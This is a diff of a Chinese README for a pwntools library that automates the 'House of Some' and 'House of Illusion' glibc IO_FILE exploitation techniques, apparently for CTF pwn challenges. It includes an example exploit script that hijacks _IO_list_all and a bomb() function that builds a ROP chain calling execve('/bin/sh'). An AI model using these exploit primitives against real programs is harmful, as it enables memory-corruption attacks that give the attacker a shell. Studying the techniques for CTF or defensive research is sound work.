@@ -1,31 +1,19 @@
-# House of Some x Illusion
+# Some of House
 
-一种新的IO_FILE利用思路，利用条件为
+House实用小工具合集
 
-1. 已知glibc基地址
-2. 可控的地址（可写入内容构造fake file）
-3. 需要一次libc内任意地址写可控地址
-4. 程序能正常退出或者通过exit()退出
-
-House of some具有以下优点：
-
-1. 无视目前的`IO_validate_vtable`检查（wide_data的vtable加上检查也可以使用）
-2. 第一次任意地址写要求低
-3. 最后攻击提权是栈上ROP，可以不需要栈迁移
-4. 源码级攻击，不依赖编译结果
-
-详细思路见
+## 目前已包含的House
 
 House of Some: https://blog.csome.cc/p/house-of-some/
 
 House of Illusion: https://enllus1on.github.io/2024/01/22/new-read-write-primitive-in-glibc-2-38/#more
 
-## 自动化
+## HouseOfSome x Illusion的自动化
 
 在exit退出之后使用如下脚本即可
 
 ```python
-from House_of_some import HouseOfSome
+from SomeofHouse import HouseOfSome
 io = process("./demo")
 
 ...
@@ -33,7 +21,7 @@ io = process("./demo")
 libc = ELF("./libc.so.6", checksec=None)
 libc.address = libc_base
 hos = HouseOfSome(libc=libc, controled_addr=fake_file_start)
-hos.bomb(io, ret_address)
+hos.bomb(io)
 ```
 
 - controled_addr：可写地址，作为延长的IO_list_all中的io file写入的起始地址
@@ -42,7 +30,7 @@ hos.bomb(io, ret_address)
 
 ```python
 from pwn import *
-from House_of_some import HouseOfSome
+from SomeofHouse import HouseOfSome
 
 context.log_level = 'debug'
 context.arch = 'amd64'
@@ -84,11 +72,10 @@ hos = HouseOfSome(libc=libc, controled_addr=fake_file_start)
 # 构造第一个任意地址写原语
 payload = hos.hoi_read_file_template(fake_file_start, 0x400, fake_file_start, 0)
 io.sendlineafter(b"content> ", payload)
-write(libc_base + 0x21a680, 8, p64(heap_addr))
+write(libc.symbols["_IO_list_all"], 8, p64(heap_addr)) # 劫持_IO_list_all
 leave() # exit
 
-io_flush_all = libc.address + 0x8ea42 # Ubuntu GLIBC 2.35-0ubuntu3.1
-hos.bomb(io, io_flush_all) # 一句话攻击
+hos.bomb(io) # 一句话攻击
 
 io.interactive()
 ```
@@ -156,14 +143,14 @@ hos = HouseOfSome(libc=libc, controled_addr=fake_file_start)
 hos.bomb(io, libc.symbols['_IO_file_underflow'] + 390)
 ```
 
-#### bomb(io, retn_addr) -> None
+#### bomb(io, retn_addr=0) -> None
 
 直接一把梭提权，运用[pwntools自带工具ROP](https://docs.pwntools.com/en/latest/rop/rop.html)，其中执行函数为`rop.call('execve', [b'/bin/sh', 0, 0])`
 
 **Parameters**
 
 - io([tube](https://docs.pwntools.com/en/latest/tubes.html#pwnlib.tubes.tube.tube)) - 交互IO，详细见pwntools文档
-- retn_addr(int) - 在运行到IO_new_read_file栈中，存放的返回地址，用于计算返回地址与_envrion泄露的栈的偏移
+- retn_addr(int) - (可选)在运行到IO_new_read_file栈中，存放的返回地址，用于计算返回地址与_envrion泄露的栈的偏移。如果不设置，则会从泄露的栈中寻找IO_flush_all的地址
 
 #### read(fd, buf, len, end=0) -> bytes
 
@@ -182,14 +169,14 @@ hos.bomb(io, libc.symbols['_IO_file_underflow'] + 390)
 - buf(int) - 待读取的地址
 - len(int) - 读取长度
 
-#### bomb_raw(io, retn_addr) -> int
+#### bomb_raw(io, retn_addr=0) -> int
 
 执行此函数之后，当前io处在等待输入，并即将写入ROP
 
 **Parameters**
 
 - io([tube](https://docs.pwntools.com/en/latest/tubes.html#pwnlib.tubes.tube.tube)) - 交互IO，详细见pwntools文档
-- retn_addr(int) - 在运行到IO_new_read_file栈中，存放的返回地址，用于计算返回地址与_envrion泄露的栈的偏移
+- retn_addr(int) - (可选)在运行到IO_new_read_file栈中，存放的返回地址，用于计算返回地址与_envrion泄露的栈的偏移。如果不设置，则会从泄露的栈中寻找IO_flush_all的地址
 
 **return**
 
